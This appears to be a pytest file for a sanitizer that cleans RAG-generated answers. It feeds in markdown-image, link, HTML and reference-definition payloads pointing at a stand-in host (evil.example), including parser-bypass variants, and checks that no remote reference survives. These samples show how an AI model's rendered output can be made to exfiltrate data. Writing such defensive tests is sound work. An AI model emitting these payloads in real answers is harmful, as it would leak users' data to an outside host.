import pytest

from grounded_rag.rag.sanitize import sanitize_answer, to_safe_markdown


def renders_remote_content(text: str) -> bool:
    return "](" in text or "http" in text or "<" in text


def test_removes_markdown_images():
    assert (
        sanitize_answer("Reset it [1]. ![x](https://evil.example/leak?q=s)") == "Reset it [1]. [x]"
    )


def test_turns_links_into_plain_text():
    assert sanitize_answer("See [the guide](https://evil.example) [2].") == "See [the guide] [2]."


def test_strips_raw_html_and_autolinks():
    text = 'Hi <img src="https://evil.example/x"> there <https://evil.example> [1].'
    assert sanitize_answer(text) == "Hi there [1]."


@pytest.mark.parametrize(
    "payload",
    [
        "![a [b] c](https://evil.example/x.png)",
        "![x](<https://evil.example/a b.png>)",
        "![x](https://evil.example/p(1).png)",
        "![x][ref]\n[ref]: https://evil.example/x.png",
        "![x][ref]\n\n   [ref]:\n   https://evil.example/x.png",
    ],
)
def test_bypass_attempts_leave_no_remote_reference(payload):
    assert not renders_remote_content(sanitize_answer(f"Answer [1]. {payload}"))


def test_reference_definition_cannot_hijack_citation_numbers():
    cleaned = sanitize_answer("Reset it [1].\n[1]: https://evil.example/track")
    assert cleaned == "Reset it [1]."


def test_keeps_citations_lists_and_bold():
    text = "Steps:\n1. Hold **Home** [1]\n2. Wait [1, 2]"
    assert sanitize_answer(text) == text


def test_paragraph_breaks_survive():
    assert sanitize_answer("First [1].\n\n\n\nSecond [2].") == "First [1].\n\nSecond [2]."


@pytest.mark.parametrize(
    "payload",
    [
        "> ![x][r]\n> [r]: https://evil.example/x.png",
        "- ![x][r]\n- [r]: https://evil.example/x.png",
        "!![x](https://evil.example/x.png)",
        "![x](https://evil.example/x.png)![y](https://evil.example/y.png)",
    ],
)
def test_container_and_repeated_bypasses_are_neutralised(payload):
    assert "http" not in sanitize_answer(f"Answer [1].\n{payload}")


def test_safe_markdown_escapes_everything_but_bold():
    rendered = to_safe_markdown("Hold **Home** [1, 2]. ![x][r] [r]: <b>(u)</b> `c`")
    assert "**Home**" in rendered
    assert "\\[1, 2\\]" in rendered
    for raw in ("![", "[r]", "<b>", "(u)", "`c`"):
        assert raw not in rendered


def test_safe_markdown_never_leaves_a_bracket_unescaped():
    rendered = to_safe_markdown("Reset [1].\n[1]: https://evil.example/track")
    assert "[" not in rendered.replace("\\[", "")
    assert "]" not in rendered.replace("\\]", "")


def test_safe_markdown_defeats_gfm_autolinks():
    rendered = to_safe_markdown("Go to https://evil.example or www.evil.example or a@evil.example")
    for raw in ("://", "www.", "a@"):
        assert raw not in rendered
    assert rendered.replace("\u200b", "").startswith("Go to https://evil.example")


def test_safe_markdown_escapes_existing_entities():
    assert to_safe_markdown("&#58;").startswith("\\&")


def test_deeply_nested_payload_fails_closed_quickly():
    payload = "!" * 50 + "[" * 50 + "x" + "](https://evil.example)" * 50
    cleaned = sanitize_answer(f"Answer [1]. {payload}")
    assert "](" not in cleaned and "!" not in cleaned and "<" not in cleaned
